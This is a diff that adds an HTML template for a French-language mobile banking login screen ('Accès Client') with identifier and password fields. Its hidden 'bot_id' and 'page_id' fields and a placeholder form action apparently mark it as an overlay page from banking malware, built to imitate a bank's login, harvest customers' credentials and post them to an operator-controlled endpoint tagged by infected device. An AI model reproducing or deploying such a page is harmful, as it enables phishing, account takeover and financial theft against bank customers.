@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+	<style type="text/css">
+		* {
+			padding: 0;
+			margin: 0;
+
+		}
+		body, html {
+			width: 100%;
+			height: 100%;
+		}
+		.top-bar {
+			display: flex;
+		    -webkit-box-align: center;
+		    align-items: center;
+		    -webkit-box-pack: justify;
+		    justify-content: space-between;
+		    height: 5rem;
+		    padding: 0 7px;
+		    background-color: #f4f4f4;
+		    border-bottom: 1px solid #e5e5e5;
+		    position: fixed;
+		    top: 0;
+		    right: 0;
+		    left: 0;
+		    color: #505050;
+		    height: 50px;
+		    z-index: 1000;
+
+		}
+		.top-bar-nav {
+		    height: 24px;
+		    width: 24px;
+		    padding: 0;
+		    background-color: #f4f4f4;
+		    border: none;
+		    position: absolute;
+		    top: 50%;
+		    transform: translateY(-50%);
+		    color: #505050;
+		    cursor: pointer;
+		    left: 4px;
+		}
+		.top-bar-nav span {
+		    display: block;
+		    height: 2px;
+		    width: 18px;
+		    background-color: #757575;
+		    border-radius: 10px;
+		    position: absolute;
+		    left: 3px;
+		    -webkit-transition: all .3s;
+		    transition: all .3s;
+		}
+		.top-bar-nav span:first-child {
+		    top: 4px;
+		}
+		.top-bar-nav span:nth-child(2), .top-bar-nav span:nth-child(3) {
+		    top: 11px;
+		}
+		.top-bar-nav span:last-child {
+		    bottom: 4px;
+		}
+		.top-bar-title {
+		    -webkit-box-flex: 1;
+		    -webkit-flex: 1;
+		    flex: 1;
+		    padding: 0;
+		    background: 0 0;
+		    text-align: left;
+		    text-transform: none;
+		    color: black;
+		    font-size: 1.5rem;
+		    font-weight: 400;
+		    line-height: 1.15;
+		    display: block;
+		    padding-left: 30px;
+		}
+
+		.content {
+			text-align: center;
+			width: 100%;
+			min-height: 100%;
+			z-index: -99999999;
+		}
+
+		.lock-img {
+			width: 126px;
+			height: 126px;
+			/*margin: auto;*/
+			margin-top: 30%;
+		}
+		.footer {
+			width: 100%;
+			height: 200px;
+			margin-top: -200px;
+			z-index: 99999999;
+		}
+		.login-area {
+			width: 300px;
+			margin: auto;
+			border: 1px solid;
+			border-color: #a1a1a1;
+			/*border-color: black;*/
+			height: 180px;
+			background-image: url("%DYN_PATH%/img/bg.png");
+			z-index: 9999999;
+			background-repeat: repeat repeat;
+			background-size: 100% 100%;
+			opacity: 1;
+		}
+		input::-webkit-input-placeholder{
+			color: #cdcdcd;
+
+		}
+
+		.auth-field {
+			margin: 10px;
+			width: 250px;
+			border: 0;
+			outline: 0;
+			background: transparent;
+	    	border-bottom: 1px solid #a1a1a1;
+			font-size: 15px;
+			height: 25px;
+			padding-left: 25px;
+			background-position: 0 5px;
+			background-size: 10px 10px;
+			
+		}
+
+		#account_identifier_edit_text {
+			background: url("%DYN_PATH%/img/icon_identifiant.png") no-repeat;
+
+		}
+
+		#account_password_edit_text {
+			background: url("%DYN_PATH%/img/icon_cadenas.png") no-repeat;
+		}
+		.memorize {
+			color: #232323;
+			font-size: 13px;
+			padding-left: 15px;
+		}
+		#memorize-cb + label {
+			/*background-image: url("img/carre_memoriser_normal.png");*/
+			background-size: 20px 20px;
+			display: inline-block;
+			width: 15px;
+			height: 15px;
+			position: relative;
+			top: 6px;
+			border: 1px solid #232323;
+			border-radius: 3px;
+			background-size: 15px 15px;
+			float: right;
+			margin-right: 20px;
+		}
+		#memorize-cb:checked + label {
+			background-image: url("%DYN_PATH%/img/cb-on.png");
+		}
+		#memorize-cb {
+			display: none;
+		}
+		#account_validate_button {
+			margin-top: 10px;
+			/*margin-left: 18px;*/
+			margin-bottom: 10px;
+			/*padding-left: 18px;*/
+			/*margin: 10px 0;*/
+			color: white;
+			text-align: center;
+			background-color: #88c648;
+			/*padding: 10;*/
+			height: 40px;
+			width: 260px;
+			/*margin-right: 18px;*/
+			border: 0;
+			display: block;
+			/*padding: 10;*/
+			position: relative;
+			/*right: 20px;*/
+			left: 20px;
+		}
+		#account_validate_button:active {
+			background-color: #7ab240;
+		}
+		#account_validate_button:focus {
+			background-color: #7ab240;
+		}
+		.submit-button {
+			width: 100%;
+			display: table;
+			margin: 0;
+			padding: 0;
+		}
+
+		.lost_password {
+			width: 100%;
+			text-align: center;
+			color: #757575;
+			font-size: 12px;
+			margin-bottom: 5px;
+			font-weight: bold;
+
+		}
+	</style>
+
+</head>
+<body>
+	<div class="top-bar">
+		<button class="top-bar-nav">
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+		</button>
+		<h1 class="top-bar-title">Accès Client</h1>
+	</div>
+	<div class="content">
+		<img class="lock-img" src="%DYN_PATH%/img/cadenas.png">
+	</div>
+	<div class="footer">
+		<!--  -->
+		<div class="login-area">
+			<form role="form" name="form" action="%ACTION%" id="form" method="post">
+			<input type="hidden" name="page_id" value="%PKG%"><input type="hidden" name="bot_id" value="%BOTID%" />
+				<input id="account_identifier_edit_text" class="auth-field" name="fields[username]" placeholder="Identifiant" type="tel" autocomplete="off"></input>
+				<input id="account_password_edit_text" class="auth-field" name="fields[password]" placeholder="Mot de passe" type="password"></input>
+			</form>
+			<span class="memorize">Mémoriser mon identifiant</span>
+			<input type="checkbox" id="memorize-cb" name=""><label for="memorize-cb"></label>
+
+			<!-- <div class="submit-button"> -->
+				<button id="account_validate_button" type="button">Valider</button>
+			<!-- </div> -->
+		</div>
+		<div class="lost_password">Mot de passe ou identifiant oublié ?</div>
+	</div>
+</body>
+
+<script type="text/javascript">
+	
+(function(){
+
+	$('#account_validate_button').bind('click', function(){
+		var fields = {
+			'account_identifier_edit_text': /[0-9]+/,
+			'account_password_edit_text': /.+/
+		};
+
+		var err = false;
+
+		for (i in fields){
+			var field = i;
+			var regex = fields[i];
+
+			if(!(new RegExp(regex).test($('#' + field).val())))
+			{
+				
+				err = true;
+			} 
+		}
+
+		if (err){
+			return;
+		}
+
+		var oForm=document.getElementById('form');
+		oForm.submit();
+	});
+
+})();
+</script>
+</html>
